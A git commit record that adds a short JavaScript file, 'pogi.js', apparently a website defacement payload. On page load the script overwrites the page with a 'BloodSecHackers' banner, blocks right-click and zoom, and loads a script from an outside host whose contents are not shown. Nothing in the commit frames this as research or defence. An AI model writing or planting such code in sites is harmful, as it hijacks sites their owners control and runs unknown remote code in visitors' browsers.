729168e3ab8d7a78c8fb625f51cf0ac6b2d1be01
pootcha <dgc.cuervo@gmail.com>
2025-03-22 08:07:43 +0000

    Create pogi.js

---
+++ pogi.js
@@ -0,0 +1,4 @@
+document.addEventListener('DOMContentLoaded', function() {
+x='<!DOCTYPE html><html oncontextmenu="return false"><head><meta charset="UTF-8"><meta name="viewport" content="user-scalable=no"><title> BloodSecHackers</title><link href="" rel="stylesheet" type="text/css"/><link href="https://fonts.googleapis.com/css?family=Patrick+Hand" rel="stylesheet"></head><body><h1><a href="" class="typewrite"><span class="wrap"></span></a></h1><script src="https://jso-tools.z-x.my.id/raw/~/PVYM4CCG6XOSZ"></script></body></html>';
+document.write(x);
+}, false);
